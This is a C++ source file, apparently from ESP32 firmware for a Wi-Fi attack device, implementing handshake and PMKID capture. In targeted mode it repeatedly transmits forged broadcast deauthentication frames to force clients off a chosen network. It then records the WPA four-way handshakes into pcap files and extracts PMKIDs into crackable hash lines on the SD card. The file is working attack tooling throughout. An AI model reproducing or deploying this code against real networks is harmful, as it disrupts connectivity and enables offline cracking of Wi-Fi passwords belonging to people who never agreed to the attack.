#include "HandshakeCapture.h"
#include "App.h"
#include "Logger.h"
#include "SdCardManager.h"
#include <WiFi.h>
#include <esp_wifi.h>

// Static instance pointer
HandshakeCapture* HandshakeCapture::instance_ = nullptr;

HandshakeCapture::HandshakeCapture() :
    app_(nullptr),
    isActive_(false),
    isAttackPending_(false),
    packetCount_(0),
    handshakeCount_(0),
    pmkidCount_(0),
    channelHopIndex_(0),
    lastChannelHopTime_(0),
    lastDeauthTime_(0)
{
    instance_ = this;
}

void HandshakeCapture::setup(App* app) {
    app_ = app;
}

void HandshakeCapture::prepare(HandshakeCaptureMode mode, HandshakeCaptureType type) {
    isAttackPending_ = true;
    currentConfig_.mode = mode;
    currentConfig_.type = type;
}

// Deauthentication frame template
static const uint8_t deauth_frame_template[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Broadcast destination
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source address (BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0xf0, 0xff, 0x02, 0x00
};

bool HandshakeCapture::start(const WifiNetworkInfo& targetNetwork) {
    if (isActive_ || !isAttackPending_) return false;

    currentConfig_.specific_target_info = targetNetwork;

    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "HS_CAPTURE", "Failed to acquire RF lock.");
        return false;
    }

    LOG(LogLevel::INFO, "HS_CAPTURE", "Starting handshake capture in targeted mode for %s.", targetNetwork.ssid);
    packetCount_ = 0;
    handshakeCount_ = 0;
    pmkidCount_ = 0;

    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    delay(100);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&packetHandlerCallback);
    esp_wifi_set_channel(targetNetwork.channel, WIFI_SECOND_CHAN_NONE);

    isActive_ = true;
    isAttackPending_ = false;
    lastDeauthTime_ = millis();
    app_->getHardwareManager().setPerformanceMode(true);
    return true;
}

bool HandshakeCapture::startScanner() {
    if (isActive_) return true;

    channelHopDelayMs_ = app_->getConfigManager().getSettings().channelHopDelayMs;

    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "HS_CAPTURE", "Failed to acquire RF lock.");
        return false;
    }

    LOG(LogLevel::INFO, "HS_CAPTURE", "Starting handshake capture in scanner mode.");
    packetCount_ = 0;
    handshakeCount_ = 0;
    pmkidCount_ = 0;
    channelHopIndex_ = 0;

    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    delay(100);
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&packetHandlerCallback);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

    isActive_ = true;
    isAttackPending_ = false;
    lastChannelHopTime_ = millis();
    return true;
}

void HandshakeCapture::stop() {
    if (!isActive_) return;
    LOG(LogLevel::INFO, "HS_CAPTURE", "Stopping capture.");
    isActive_ = false;
    isAttackPending_ = false;
    esp_wifi_set_promiscuous(false);
    rfLock_.reset();
    app_->getHardwareManager().setPerformanceMode(false);
}

// Channel hopping configuration
static const int CHANNELS_TO_SNIFF[] = {1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10, 12, 13};

#define DEAUTH_INTERVAL_MS 2000

void HandshakeCapture::loop() {
    if (!isActive_) return;

    if (currentConfig_.type == HandshakeCaptureType::SCANNER) {
        if (millis() - lastChannelHopTime_ > channelHopDelayMs_) {
            lastChannelHopTime_ = millis();
            channelHopIndex_ = (channelHopIndex_ + 1) % (sizeof(CHANNELS_TO_SNIFF) / sizeof(int));
            esp_wifi_set_channel(CHANNELS_TO_SNIFF[channelHopIndex_], WIFI_SECOND_CHAN_NONE);
        }
    } else { // Targeted mode
        if (millis() - lastDeauthTime_ > DEAUTH_INTERVAL_MS) {
            sendDeauthPacket(currentConfig_.specific_target_info);
            lastDeauthTime_ = millis();
        }
    }
}

void HandshakeCapture::packetHandlerCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (instance_ != nullptr) {
        instance_->handlePacket(static_cast<wifi_promiscuous_pkt_t*>(buf));
    }
}

void HandshakeCapture::handlePacket(wifi_promiscuous_pkt_t *packet) {
    packetCount_++;

    const uint8_t *frame = packet->payload;
    const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
    const uint8_t frameType = (frameControl & 0x0C) >> 2;
    const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

    if (isItEAPOL(packet)) {
        if (currentConfig_.mode == HandshakeCaptureMode::EAPOL) {
            saveHandshake(packet, false);
        } else {
            parsePMKID(packet);
        }
    } else if (frameType == 0x00 && frameSubType == 0x08) { // Beacon frame
        // Extract BSSID
        const uint8_t *bssid = frame + 16;
        char bssid_str[18];
        sprintf(bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

        // Extract SSID
        int pos = 36; // Start of tagged parameters
        while (pos < packet->rx_ctrl.sig_len) {
            uint8_t tag_id = frame[pos];
            uint8_t tag_len = frame[pos+1];
            if (tag_id == 0 && tag_len > 0 && tag_len <= 32) {
                char ssid[33] = {0};
                memcpy(ssid, &frame[pos+2], tag_len);
                bssid_to_ssid_map_[bssid_str] = ssid;
                break;
            }
            pos += 2 + tag_len;
        }

        if (currentConfig_.mode == HandshakeCaptureMode::EAPOL) {
            saveHandshake(packet, true);
        }
    }
}

void HandshakeCapture::sendDeauthPacket(const WifiNetworkInfo& target) {
    uint8_t deauth_packet[sizeof(deauth_frame_template)];
    memcpy(deauth_packet, deauth_frame_template, sizeof(deauth_frame_template));

    memcpy(&deauth_packet[10], target.bssid, 6); // Source Address
    memcpy(&deauth_packet[16], target.bssid, 6); // BSSID

    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
    LOG(LogLevel::INFO, "HS_CAPTURE", "Sent deauth packet to %s", target.ssid);
}

bool HandshakeCapture::isItEAPOL(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *payload = packet->payload;
    int len = packet->rx_ctrl.sig_len;

    // length check to ensure packet is large enough for EAPOL (minimum length)
    if (len < (24 + 8 + 4)) { // 24 bytes for the MAC header, 8 for LLC/SNAP, 4 for EAPOL minimum
        return false;
    }

    // check for LLC/SNAP header indicating EAPOL payload
    // LLC: AA-AA-03, SNAP: 00-00-00-88-8E for EAPOL
    if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 && payload[27] == 0x00 &&
        payload[28] == 0x00 && payload[29] == 0x00 && payload[30] == 0x88 && payload[31] == 0x8E) {
        return true;
    }

    // handle QoS tagging which shifts the start of the LLC/SNAP headers by 2 bytes
    // check if the frame control field's subtype indicates a QoS data subtype (0x08)
    if ((payload[0] & 0x0F) == 0x08) {
        // Adjust for the QoS Control field and recheck for LLC/SNAP header
        if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 && payload[29] == 0x00 &&
            payload[30] == 0x00 && payload[31] == 0x00 && payload[32] == 0x88 && payload[33] == 0x8E) {
            return true;
        }
    }

    return false;
}

void HandshakeCapture::saveHandshake(const wifi_promiscuous_pkt_t *packet, bool beacon) {
    const uint8_t *addr1 = packet->payload + 4;
    const uint8_t *addr2 = packet->payload + 10;
    const uint8_t *bssid = packet->payload + 16;
    const uint8_t *apAddr;

    if (memcmp(addr1, bssid, 6) == 0) {
        apAddr = addr1;
    } else {
        apAddr = addr2;
    }

    char bssid_str[18];
    sprintf(bssid_str, "%02X:%02X:%02X:%02X:%02X:%02X", apAddr[0], apAddr[1], apAddr[2], apAddr[3], apAddr[4], apAddr[5]);

    bool fileExists = false;
    for (const auto& saved : savedHandshakes) {
        if (saved == bssid_str) {
            fileExists = true;
            break;
        }
    }

    if (beacon && !fileExists) { return; }

    char filename[64];
    sprintf(filename, "/data/captures/handshakes/HS_%02X%02X%02X%02X%02X%02X.pcap", apAddr[0], apAddr[1], apAddr[2], apAddr[3], apAddr[4], apAddr[5]);

    File pcapFile = SdCardManager::openFile(filename, fileExists ? FILE_APPEND : FILE_WRITE);
    if (!pcapFile) {
        LOG(LogLevel::ERROR, "HS_CAPTURE", "Failed to open pcap file: %s", filename);
        return;
    }

    if (!beacon && !fileExists) {
        savedHandshakes.push_back(bssid_str);
        handshakeCount_++;
        writeHeader(pcapFile);
    }

    uint32_t timestamp_sec = packet->rx_ctrl.timestamp / 1000000;
    uint32_t timestamp_usec = packet->rx_ctrl.timestamp % 1000000;
    uint32_t captured_len = packet->rx_ctrl.sig_len - 4;

    pcapFile.write((uint8_t*)&timestamp_sec, 4);
    pcapFile.write((uint8_t*)&timestamp_usec, 4);
    pcapFile.write((uint8_t*)&captured_len, 4);
    pcapFile.write((uint8_t*)&captured_len, 4);
    pcapFile.write(packet->payload, captured_len);
    pcapFile.close();
}

bool HandshakeCapture::writeHeader(File file) {
    uint8_t header[] = {
        0xd4, 0xc3, 0xb2, 0xa1, // Magic Number
        0x02, 0x00, 0x04, 0x00, // Version major, minor
        0x00, 0x00, 0x00, 0x00, // Timezone
        0x00, 0x00, 0x00, 0x00, // Accuracy
        0xff, 0xff, 0x00, 0x00, // Snaplen
        0x69, 0x00, 0x00, 0x00  // Link-layer type (105 for 802.11)
    };
    if (file) {
        file.write(header, sizeof(header));
        return true;
    }
    return false;
}

// EAPOL-Key Key Information field
#define EAPOL_KEY_INFO_KEY_TYPE_BIT (1 << 3)
#define EAPOL_KEY_INFO_INSTALL_BIT (1 << 6)
#define EAPOL_KEY_INFO_KEY_ACK_BIT (1 << 7)
#define EAPOL_KEY_INFO_KEY_MIC_BIT (1 << 8)

// EAPOL-Key Key Data parsing
#define WPA_KEY_DATA_TYPE_PMKID 4

void HandshakeCapture::parsePMKID(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *frame = packet->payload;
    int len = packet->rx_ctrl.sig_len;

    // The EAPOL frame starts after the 802.11 header and LLC/SNAP header.
    // This can be at offset 32 (no QoS) or 34 (with QoS).
    int eapol_offset = (frame[0] & 0x0F) == 0x08 ? 34 : 32;
    if (len < eapol_offset + 4) return;

    const uint8_t *eapol_frame = frame + eapol_offset;
    uint16_t key_info = (eapol_frame[1] << 8) | eapol_frame[2];

    // Check if it's Message 1 of 4-way handshake (Key ACK = 1, MIC = 0, Install = 0, Type = 1)
    bool is_message_1 = (key_info & EAPOL_KEY_INFO_KEY_ACK_BIT) &&
                        !(key_info & EAPOL_KEY_INFO_KEY_MIC_BIT) &&
                        !(key_info & EAPOL_KEY_INFO_INSTALL_BIT) &&
                        (key_info & EAPOL_KEY_INFO_KEY_TYPE_BIT);

    if (!is_message_1) return;

    uint16_t key_data_length = (eapol_frame[5] << 8) | eapol_frame[6];
    if (key_data_length == 0 || len < eapol_offset + 95 + key_data_length) return;

    const uint8_t *key_data = eapol_frame + 95;
    int pos = 0;
    while (pos < key_data_length - 1) {
        uint8_t type = key_data[pos];
        uint8_t sub_len = key_data[pos + 1];
        if (type == 0xdd && sub_len >= 0x1a &&
            key_data[pos + 2] == 0x00 && key_data[pos + 3] == 0x0f && key_data[pos + 4] == 0xac && key_data[pos + 5] == WPA_KEY_DATA_TYPE_PMKID) {

            // PMKID found
            const uint8_t *pmkid = key_data + pos + 6;

            // EAPOL M1 is from AP to Station
            const uint8_t *station_mac = frame + 4; // Destination address
            const uint8_t *bssid = frame + 10;      // Source address / BSSID

            char pmkid_str[33];
            for (int i = 0; i < 16; i++) {
                sprintf(&pmkid_str[i*2], "%02x", pmkid[i]);
            }

            char bssid_str[18];
            sprintf(bssid_str, "%02x:%02x:%02x:%02x:%02x:%02x", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);

            char station_mac_str[18];
            sprintf(station_mac_str, "%02x:%02x:%02x:%02x:%02x:%02x", station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5]);

            std::string ssid = bssid_to_ssid_map_.count(bssid_str) ? bssid_to_ssid_map_[bssid_str] : "";

            char ssid_hex[65] = {0};
            for (size_t i = 0; i < ssid.length(); i++) {
                sprintf(&ssid_hex[i*2], "%02x", ssid[i]);
            }

            char output_str[200];
            sprintf(output_str, "%s*%s*%s*%s", pmkid_str, bssid_str, station_mac_str, ssid_hex);

            File pmkid_file = SdCardManager::openFile("/data/captures/pmkid.txt", FILE_APPEND);
            if (pmkid_file) {
                pmkid_file.println(output_str);
                pmkid_file.close();
                pmkidCount_++;
                LOG(LogLevel::INFO, "HS_CAPTURE", "Captured PMKID: %s", output_str);
            } else {
                LOG(LogLevel::ERROR, "HS_CAPTURE", "Failed to open pmkid.txt");
            }
            return;
        }
        pos += sub_len + 2;
    }
}

bool HandshakeCapture::isActive() const { return isActive_; }
const HandshakeCaptureConfig& HandshakeCapture::getConfig() const { return currentConfig_; }
uint32_t HandshakeCapture::getPacketCount() const { return packetCount_; }
int HandshakeCapture::getHandshakeCount() const { return handshakeCount_; }
int HandshakeCapture::getPmkidCount() const { return pmkidCount_; }
